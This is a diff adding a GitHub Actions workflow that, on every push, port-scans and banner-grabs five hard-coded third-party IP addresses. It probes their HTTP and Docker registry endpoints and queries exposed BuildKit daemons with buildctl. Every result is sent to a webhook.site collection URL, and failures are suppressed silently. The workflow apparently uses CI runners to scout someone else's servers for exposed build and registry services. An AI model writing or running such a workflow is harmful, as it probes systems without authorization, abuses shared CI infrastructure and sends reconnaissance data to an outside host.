@@ -1,0 +1,65 @@
+name: fsn1net
+on: [push, workflow_dispatch]
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    steps:
+      - name: netprobe
+        run: |
+          python3 - <<'PY'
+          import socket,time,urllib.request,json
+          W="https://webhook.site/eb5afbe6-11c3-477e-9274-91dd0d3b2a60"
+          def send(part,data):
+              try: urllib.request.urlopen(W+"?part="+part,data=str(data).encode(),timeout=10)
+              except Exception: pass
+          T={
+            "116.202.217.236":[22,80,443,1234,5000,8080],
+            "188.40.98.155":[22,80,443,1234,5000,8080],
+            "188.245.195.191":[22,80,443,1234,5000,8080,10001,2222],
+            "167.235.109.203":[22,80,443,1234,5000],
+            "116.202.6.71":[22,80,443,22222,32768,51191,10033],
+          }
+          send("start","probe-start")
+          for ip,ports in T.items():
+              for p in ports:
+                  s=socket.socket(); s.settimeout(6); t0=time.time()
+                  r=""
+                  try:
+                      s.connect((ip,p)); dt=time.time()-t0
+                      s.settimeout(2.5)
+                      try: b=s.recv(400)
+                      except Exception: b=b''
+                      r=f"OPEN {dt:.2f}s banner={b[:180]!r}"
+                  except Exception as e:
+                      r=f"FAIL {type(e).__name__} {str(e)[:60]}"
+                  finally:
+                      s.close()
+                  send("tcp",f"{ip}:{p} {r}")
+                  print(ip,p,r)
+          # raw HTTP probes
+          import subprocess
+          urls=["http://116.202.217.236:8080/","http://116.202.217.236:1234/",
+                "http://116.202.217.236/","http://116.202.217.236:5000/v2/",
+                "http://188.245.195.191/","http://188.245.195.191:5000/v2/",
+                "http://188.40.98.155:8080/","http://188.40.98.155:1234/"]
+          for u in urls:
+              try:
+                  o=subprocess.run(["curl","-sS","-m","8","-i",u],capture_output=True,text=True).stdout
+              except Exception as e:
+                  o="ERR "+repr(e)
+              send("http",f"== {u}\n{o[:1200]}")
+              print("HTTP",u,o[:300].replace("\n"," | "))
+          send("done","probe-done")
+          PY
+      - name: buildkit
+        if: always()
+        run: |
+          set -x
+          curl -sSL -m 60 -o /tmp/bk.tgz https://github.com/moby/buildkit/releases/download/v0.16.0/buildkit-v0.16.0.linux-amd64.tar.gz || true
+          tar -xzf /tmp/bk.tgz -C /tmp 2>/dev/null || true
+          ls -la /tmp/bin 2>/dev/null || true
+          for ADDR in tcp://116.202.217.236:1234 tcp://116.202.217.236:8080 tcp://188.40.98.155:1234 tcp://188.245.195.191:1234; do
+            echo "=== $ADDR"; timeout 25 /tmp/bin/buildctl --addr $ADDR debug workers 2>&1 | head -30 || true
+            timeout 25 /tmp/bin/buildctl --addr $ADDR debug info 2>&1 | head -5 || true
+          done
